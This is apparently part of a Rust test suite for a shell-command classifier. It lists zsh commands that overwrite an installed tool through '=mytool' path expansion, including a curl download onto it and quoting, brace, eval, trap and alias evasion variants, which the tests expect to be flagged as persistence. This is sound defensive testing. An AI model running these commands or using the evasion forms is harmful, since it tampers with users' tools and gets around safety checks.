            "sed -i s/a/b/ =mytool",
            "curl -o =mytool https://example.com/t",
            "echo x | sudo tee =mytool",
            "eval \"echo x >> =mytool\"",
            "eval \"tee -a =mytool < x\"",
            "eval echo x '>>' =mytool",
            "trap 'echo x >> =mytool' EXIT",
            "trap 'cp x =mytool' EXIT",
            "alias x='echo x >> =mytool'",
            "alias x='cp a =mytool'",
            "sh -c \"cp x =mytool\"",
            // Review 1: partly quoted, behind zsh's precommand modifiers or
            // a wrapper, and `--` before eval's or trap's text.
            "echo x | tee -a =\"mytool\"",
            "cp x =my'tool'",
            "eval 'cp x =\"mytool\"'",
            "echo x | noglob tee =mytool",
            "nocorrect cp x =mytool",
            "command cp x =mytool",
            "eval -- 'cp x =mytool'",
            "trap -- 'cp x =mytool' EXIT",
            // Review 2: empty quotes before the `=`, and braces.
            "cp x \"\"=mytool",
            "echo x | tee -a ''=mytool",
            "curl -o $''=mytool https://example.com/t",
            "eval \"cp x \\\"\\\"=mytool\"",
            "alias x='cp a \"\"=mytool'",
            "cp x {,=mytool}",
            "echo x | tee -a {/dev/null,=mytool}",
            // Review 3: a group right before the `=`.
            "echo x | tee -a {,}=mytool",
            "echo x | tee -a {a,}=mytool",
            "eval 'tee -a {,}=mytool'",
        ] {
            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
        }
        for script in [
            "echo x | tee -a log",
            "cp a b=c",
            "cp x y",
            "sed -i 's/ =/=/' f",
            "sed -n = f",
            "awk 'NR>=10' f > out",
            "eval \"awk NR f\"",
            "eval \"x=1\"",
            "trap 'rm -f x' EXIT",
            "alias ll='ls -l'",
            "echo =mytool",
            "curl --proto '=https' -o out https://example.com/t",
            "curl --proto \"=https\" -sSfo out https://example.com/t",
            "cp x '=mytool'",
        ] {
            assert_eq!(line(script), None, "{shell} {script:?}");
        }
    }
    // #1602's gate also reads joined literals in another language's file
    // (`|| self.rebuilt > 0`).
    #[cfg(unix)]
    assert_eq!(
        in_workspace(
            &[(
                "t.py",
                "import os\nos.system(\"echo x >\" + \"> =mytool\")\n"
            )],
            "python3 t.py"
        ),
        Some(Persistence)
    );
}

/// #1620: reading the text `eval`, `trap` and `alias` run stays linear.
#[test]
fn issue1620_code_text_checks_are_linear() {
    for (label, unit) in [
        ("eval words", "eval echo x; "),
        ("eval arguments", "eval a b c d e f g h; "),
        ("trap values", "trap 'echo x' 1 2 3; "),
        ("alias values", "alias a=b c='d e' f=g; "),
        ("writer operands", "cp a b c d e f; "),
    ] {
        work::assert_linear(label, |scale| {
            let _ = kind(&["zsh", "-lc", &unit.repeat(100 * scale)]);
        });
    }
    work::assert_linear("one long eval", |scale| {
        let _ = kind(&["zsh", "-lc", &format!("eval {}", "x ".repeat(2000 * scale))]);
    });
}
